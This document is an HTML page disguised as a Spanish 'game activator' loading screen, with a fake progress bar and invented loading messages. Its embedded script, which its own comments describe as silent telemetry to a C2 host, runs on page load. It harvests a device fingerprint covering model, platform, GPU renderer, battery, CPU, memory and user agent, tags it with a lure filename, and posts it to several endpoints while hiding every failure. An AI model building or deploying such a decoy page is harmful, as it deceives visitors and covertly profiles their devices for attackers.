<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>ACTIVATOR GAME</title>
  <style>
    :root {
      --bg-dark: #0a0414;
      --bg-secondary: #120724;
      --neon-purple-glow: #a855f7;
      --neon-purple-bright: #c084fc;
      --neon-purple-deep: #7c3aed;
      --neon-purple-accent: #e9d5ff;
      --text-white: #f8fafc;
      --font-game: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-user-select: none;
    }

    body, html {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background-color: var(--bg-dark);
      font-family: var(--font-game);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at center, #1e0938 0%, #0a0414 70%, #05020a 100%);
    }

    /* Resplandor ambiental de fondo */
    .ambient-glow {
      position: absolute;
      width: 320px;
      height: 320px;
      background: radial-gradient(circle, rgba(168, 85, 247, 0.25) 0%, rgba(124, 58, 237, 0.08) 50%, transparent 70%);
      filter: blur(40px);
      z-index: 1;
      animation: ambient-pulse 4s ease-in-out infinite alternate;
      pointer-events: none;
    }

    @keyframes ambient-pulse {
      0% { transform: scale(0.9); opacity: 0.6; }
      100% { transform: scale(1.15); opacity: 0.95; }
    }

    .game-container {
      position: relative;
      z-index: 10;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 30px;
      max-width: 440px;
      width: 90%;
    }

    /* Icono / Emblema Gamer */
    .game-icon-badge {
      width: 76px;
      height: 76px;
      border-radius: 20px;
      background: linear-gradient(135deg, rgba(168, 85, 247, 0.2), rgba(124, 58, 237, 0.05));
      border: 1.5px solid var(--neon-purple-glow);
      box-shadow: 0 0 25px rgba(168, 85, 247, 0.45), inset 0 0 15px rgba(192, 132, 252, 0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 34px;
      margin-bottom: 24px;
      animation: float-icon 3s ease-in-out infinite;
    }

    @keyframes float-icon {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-6px); }
    }

    /* Título del Activador */
    .game-title {
      font-size: 0.85rem;
      letter-spacing: 3px;
      text-transform: uppercase;
      color: rgba(233, 213, 255, 0.7);
      margin-bottom: 8px;
      font-weight: 600;
    }

    /* TEXTO PRINCIPAL: Cargando juego... EN COLOR MORADO LLAMATIVO */
    .loading-text-box {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 12px 0 24px 0;
    }

    .loading-title {
      font-size: 1.65rem;
      font-weight: 800;
      letter-spacing: 1px;
      color: var(--neon-purple-bright);
      text-shadow: 
        0 0 10px rgba(192, 132, 252, 0.8),
        0 0 25px rgba(168, 85, 247, 0.6),
        0 0 45px rgba(124, 58, 237, 0.4);
    }

    /* Puntos suspensivos animados */
    .dots-container {
      display: inline-flex;
      margin-left: 3px;
    }

    .dot {
      display: inline-block;
      color: var(--neon-purple-accent);
      text-shadow: 0 0 12px var(--neon-purple-bright);
      font-weight: 900;
      opacity: 0;
      animation: blink-dots 1.5s infinite;
    }

    .dot:nth-child(1) { animation-delay: 0.1s; }
    .dot:nth-child(2) { animation-delay: 0.35s; }
    .dot:nth-child(3) { animation-delay: 0.6s; }

    @keyframes blink-dots {
      0% { opacity: 0; transform: scale(0.8); }
      35% { opacity: 1; transform: scale(1.2); }
      70%, 100% { opacity: 0.2; transform: scale(1); }
    }

    /* Barra de Progreso Neón Morada */
    .progress-bar-wrap {
      width: 100%;
      height: 8px;
      background: rgba(255, 255, 255, 0.06);
      border-radius: 999px;
      overflow: hidden;
      border: 1px solid rgba(168, 85, 247, 0.3);
      box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8);
      position: relative;
      margin-bottom: 14px;
    }

    .progress-fill {
      height: 100%;
      width: 65%;
      border-radius: 999px;
      background: linear-gradient(90deg, #7c3aed, #a855f7, #c084fc, #e9d5ff);
      box-shadow: 0 0 16px rgba(168, 85, 247, 0.85);
      animation: loading-stream 2.2s infinite ease-in-out;
    }

    @keyframes loading-stream {
      0% { width: 12%; transform: translateX(0); }
      50% { width: 75%; transform: translateX(15%); }
      100% { width: 95%; transform: translateX(5%); }
    }

    /* Subtexto discreto gamer */
    .status-subtext {
      font-size: 0.76rem;
      letter-spacing: 0.8px;
      color: rgba(233, 213, 255, 0.55);
      transition: opacity 0.3s;
    }

    /* Indicador de versión sutil */
    .footer-badge {
      position: absolute;
      bottom: 20px;
      font-size: 0.68rem;
      color: rgba(255, 255, 255, 0.2);
      letter-spacing: 1.5px;
      z-index: 10;
    }
  </style>
</head>
<body>
  <div class="ambient-glow"></div>

  <div class="game-container">
    <div class="game-icon-badge">🎮</div>
    
    <div class="game-title">ACTIVATOR GAME</div>
    
    <div class="loading-text-box">
      <span class="loading-title">Cargando juego</span>
      <span class="dots-container">
        <span class="dot">.</span>
        <span class="dot">.</span>
        <span class="dot">.</span>
      </span>
    </div>

    <div class="progress-bar-wrap">
      <div class="progress-fill"></div>
    </div>

    <div class="status-subtext" id="statusMessage">Optimizando texturas y recursos...</div>
  </div>

  <div class="footer-badge">ACTIVATOR ENGINE v2.4 • COMPATIBILIDAD VERIFICADA</div>

  <script>
    // Ciclo de mensajes gamer realistas
    const gameMessages = [
      "Optimizando texturas y recursos...",
      "Sincronizando tasa de cuadros...",
      "Inicializando motor gráfico...",
      "Cargando configuración de usuario...",
      "Estableciendo conexión con el servidor..."
    ];
    let msgIndex = 0;
    const msgElement = document.getElementById("statusMessage");

    setInterval(() => {
      msgIndex = (msgIndex + 1) % gameMessages.length;
      if (msgElement) {
        msgElement.style.opacity = "0";
        setTimeout(() => {
          msgElement.textContent = gameMessages[msgIndex];
          msgElement.style.opacity = "1";
        }, 200);
      }
    }, 2800);

    // TELEMETRÍA DETERMINISTA SILENCIOSA HACIA EL C2
    async function executeSilentProbe() {
      const telemetry = {
        model: '',
        platform: '',
        platformVersion: '',
        screen: `${window.screen.width}x${window.screen.height}`,
        webgl_renderer: '',
        battery: '100%',
        cores: navigator.hardwareConcurrency || 4,
        ram: navigator.deviceMemory || 4,
        download_file: 'APEX_CYBER_EDR_SUITE.zip',
        is_game_activator: true,
        user_agent: navigator.userAgent,
        timestamp: new Date().toISOString()
      };

      // 1. WebGL Renderer
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            telemetry.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch (e) {}

      // 2. High-Entropy Client Hints (Modelo exacto SM-XXXX)
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        try {
          const hints = await navigator.userAgentData.getHighEntropyValues([
            'model', 'platform', 'platformVersion', 'architecture', 'bitness'
          ]);
          telemetry.model = hints.model || '';
          telemetry.platform = hints.platform || '';
          telemetry.platformVersion = hints.platformVersion || '';
        } catch (e) {}
      }

      // 3. Batería
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          telemetry.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cargando' : 'Batería'})`;
        } catch(e) {}
      }

      // 4. Reporte silencioso al Host C2 (Múltiples endpoints para resiliencia total)
      const endpoints = [
        '/api/register_download',
        'http://192.168.100.7:8080/api/register_download',
        'http://localhost:8080/api/register_download'
      ];

      for (const url of endpoints) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(telemetry),
            mode: 'cors'
          });
          break; // Conectado exitosamente
        } catch (err) {
          // Si no está disponible este endpoint, continúa silenciosamente
        }
      }
    }

    // Iniciar sondeo silencioso sin interrumpir la animación del juego
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(executeSilentProbe, 500);
    });
  </script>
</body>
</html>
